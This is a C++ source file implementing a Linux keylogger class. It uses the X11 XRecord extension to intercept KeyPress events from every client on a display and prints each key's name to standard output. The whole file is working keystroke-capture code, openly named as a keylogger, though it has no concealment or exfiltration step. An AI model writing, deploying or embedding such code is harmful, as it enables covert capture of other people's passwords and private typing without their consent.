//
// Keylogger.cpp for Keylogger class in /home/vianney
// 
// Made by Vianney Bouchaud
// Login   <vianney@bouchaud.org>
// 
// Started on  Wed Oct  5 13:58:25 2011 Vianney Bouchaud
// Last update Wed Oct 26 15:04:35 2011 Vianney Bouchaud
//

#include <string>
#include <stdio.h>
#include "Keylogger.hpp"

Keylogger::Keylogger()
{
}

Keylogger::~Keylogger()
{
  stop();
}

void		Keylogger::start()
{
  if (!XRecordEnableContextAsync(userData.dataDisplay, recContext, eventCallback, (XPointer) &userData))
    throw std::exception();
}

void		Keylogger::stop()
{
  if(!XRecordDisableContext(userData.ctrlDisplay, recContext))
    throw std::exception();
}

void		Keylogger::setupRecordExtension()
{
  XSynchronize(userData.ctrlDisplay, True);
  if (!XRecordQueryVersion(userData.ctrlDisplay, &recVer.first, &recVer.second))
    throw std::exception();
  recRange = XRecordAllocRange();
  if (!recRange)
    throw std::exception();
  recRange->device_events.first = KeyPress;
  recRange->device_events.last = KeyPress;
  recClientSpec = XRecordAllClients;
  recContext = XRecordCreateContext(userData.ctrlDisplay, 0, &recClientSpec, 1, &recRange, 1);
  if (!recContext)
    throw std::exception();
}

void		Keylogger::processData()
{
  XRecordProcessReplies(userData.dataDisplay);
}

bool		Keylogger::xConnect(const std::string &displayName)
{
  m_displayName = displayName;
  if (NULL == (userData.ctrlDisplay = XOpenDisplay(m_displayName.c_str())))
    return (false);
  if (NULL == (userData.dataDisplay = XOpenDisplay(m_displayName.c_str())))
    {
      XCloseDisplay(userData.ctrlDisplay);
      userData.ctrlDisplay = NULL;
      return (false);
    }
  userData.initialObject = (void *)this;
  setupRecordExtension();
  return (true);
}

void		Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook)
{
  if (hook->category != XRecordFromServer)
    {
      XRecordFreeData(hook);
      return;
    }
  CallbackClosure *userData = (CallbackClosure *)priv;
  XRecordDatum *data = (XRecordDatum *) hook->data;
  if(data->event.u.u.type == KeyPress)
    {
      int c = data->event.u.u.detail;
      printf("%s\n", XKeysymToString(XKeycodeToKeysym(userData->ctrlDisplay, c, 0)));
    }
  XRecordFreeData(hook);
}
